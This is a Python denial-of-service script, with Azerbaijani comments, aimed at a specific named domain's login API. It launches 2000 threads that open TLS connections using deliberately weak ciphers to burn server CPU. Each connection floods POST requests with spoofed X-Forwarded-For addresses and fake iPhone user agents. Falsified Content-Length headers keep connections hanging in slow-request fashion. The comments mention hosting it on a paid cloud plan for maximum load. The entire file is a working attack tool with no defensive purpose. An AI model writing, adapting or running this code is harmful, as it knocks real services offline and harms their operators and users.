import socket
import ssl
import threading
import random
import time
import os

# --- MAXIMUM OVERDRIVE CONFIG ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 2000 # Railway Paid plan üçün maksimal şəbəkə sıxlığı

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def hyper_nova():
    # SSL Handshake-i ən baha başa gələn üsulla qururuq (Server CPU-su üçün ölümcüldür)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=1') # Serveri köhnə şifrləmələri həll etməyə məcbur edir

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serverin API qatını (Backend) yoran mürəkkəb müraciət
            # Hər paket serverin məlumat bazasında axtarış aparmasını təmin edir
            for _ in range(300):
                path = f"/api/user/login?v={random.random()}&id={r_str(32)}&invite_code={random.randint(111111, 999999)}"
                
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_0 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"Accept: application/json, text/plain, */*\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {random.randint(5000, 15000)}\r\n" # Serveri böyük data gözləməyə məcbur et
                    f"Connection: Keep-Alive\r\n"
                    f"\r\n"
                    f"{'{\"key\":\"' + r_str(100) + '\"}'}"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı saxlamaq üçün yarımçıq paketlər (Slow-Read)
                conn.send(os.urandom(1))
            
            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"💀 HYPER-NOVA PROTOCOL INITIALIZED: {TARGET_HOST}")
    print("[!] Saturation Level: 2000 Parallel Warheads.")
    
    for i in range(THREADS):
        t = threading.Thread(target=hyper_nova)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Heavy Units Deployed...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
